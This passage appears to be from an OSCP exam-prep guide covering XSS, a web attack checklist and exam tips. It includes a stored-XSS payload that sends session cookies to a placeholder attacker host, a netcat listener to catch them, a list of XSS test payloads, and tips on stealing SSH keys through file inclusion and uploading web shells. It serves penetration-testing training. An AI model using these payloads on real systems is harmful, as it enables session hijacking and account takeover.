XSS lets you inject JavaScript into a web page that other users view. The JavaScript executes in THEIR browser, not on the server. This means you can steal session cookies, redirect users, modify the page content, or perform actions as the victim.

### OSCP relevance

XSS is less common as an initial access vector on the OSCP compared to SQLi or command injection. However, it can appear in scenarios where you need to steal an admin's session cookie to access restricted functionality.

### Three types

**Reflected XSS:** Your payload is in the URL. The server reflects it back in the page. Only works if the victim clicks your malicious link.

```
http://TARGET/search?q=<script>alert(1)</script>
```

**Stored XSS:** Your payload gets saved in the database (like a comment or forum post). Every user who views the page gets hit. More dangerous.

```
# In a comment form, submit:
<script>document.location='http://KALI_IP:8080/?c='+document.cookie</script>
```

**DOM-based XSS:** The JavaScript itself (not the server) inserts user input into the page unsafely.

### Cookie stealing (the exam-relevant use)

```bash
# On Kali — start a listener to catch cookies
nc -lvnp 8080

# Inject this into a stored XSS vulnerable field
<script>document.location='http://KALI_IP:8080/?c='+document.cookie</script>

# When an admin views the page, their cookie arrives at your listener
# Use the cookie to hijack their session
```

### Common XSS test payloads

```html
<script>alert(1)</script>
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
```

---

## Web Attack Methodology Checklist

For every web application you encounter on the exam:

```
□ View the page source (Ctrl+U) — look for comments, hidden fields, paths
□ Check robots.txt and sitemap.xml
□ Run gobuster/dirb with extensions (-x php,txt,html,bak,old,conf,xml,js)
□ Identify the technology (PHP? ASP? Java? Node? Check headers, file extensions, error messages)
□ Check for CMS (WordPress → wpscan, Drupal → droopescan, Joomla)
□ Test every input field for injection:
  □ Single quote (') — does it cause an error? (SQLi)
  □ Semicolon + command (;whoami) — does it execute? (command injection)
  □ ../ sequences — does it traverse? (LFI)
  □ <script>alert(1)</script> — does it render? (XSS)
□ Check for file upload — can you upload a web shell?
□ Check for login pages — try default credentials (admin:admin, admin:password)
□ Check for API endpoints (/api, /v1, /graphql)
□ Check for backup files (.bak, .old, .swp, ~, .php.bak, web.config.old)
□ If you find credentials, try them on SSH, other login pages, and other machines
```

---

## Exam Tips for Web Attacks

1. **Read the page source.** Every single time. HTML comments from developers are a goldmine.

2. **Try default credentials before fancy attacks.** admin:admin, admin:password, root:root, guest:guest, the application name as both username and password.

3. **If gobuster finds nothing with the common wordlist, try a bigger one.** `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` with extensions like `-x php,txt,bak,old`.

4. **SQLi is more common than you think.** Test every parameter — not just obvious login forms. Search boxes, URL parameters, cookie values, HTTP headers.

5. **When you find LFI, always try reading SSH keys.** Check every user from `/etc/passwd`: `/home/USER/.ssh/id_rsa`. A readable private key is instant SSH access.

6. **Don't spend 3 hours on blind SQLi when the machine might have command injection on a different page.** If one attack isn't working after 30 minutes of trying, enumerate more and look for other vectors.

7. **File upload + LFI is a powerful combo.** Upload a file you can't directly access (wrong directory or wrong extension). Then use LFI to include and execute it.
